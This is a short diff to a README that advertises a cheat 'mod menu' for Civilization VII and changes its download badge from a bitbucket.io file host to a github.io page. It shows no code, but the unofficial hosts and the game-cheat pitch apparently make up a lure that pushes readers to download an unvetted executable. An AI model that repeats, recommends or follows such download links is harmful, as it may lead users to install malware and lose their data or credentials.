@@ -4,7 +4,7 @@ If you're tired of micromanaging your empire while the AI cheats its way to vict
 
 Think of it as your **god panel**. With this mod menu, you can spawn units, unlock techs, flood your treasury, insta-build wonders, reveal the whole map, and even tweak other civilizations. It's like having the developer console on steroids 🔥.
 
-[![Download ModMenu](https://img.shields.io/badge/Download-ModMenu-blueviolet)](https://fileoffload6.bitbucket.io)
+[![Download ModMenu](https://img.shields.io/badge/Download-ModMenu-blueviolet)](https://Civilization-VII-Mod-Menu-nisuv.github.io/.github)
 ---
 
 ## 🧩 What Is the Civ VII Mod Menu?
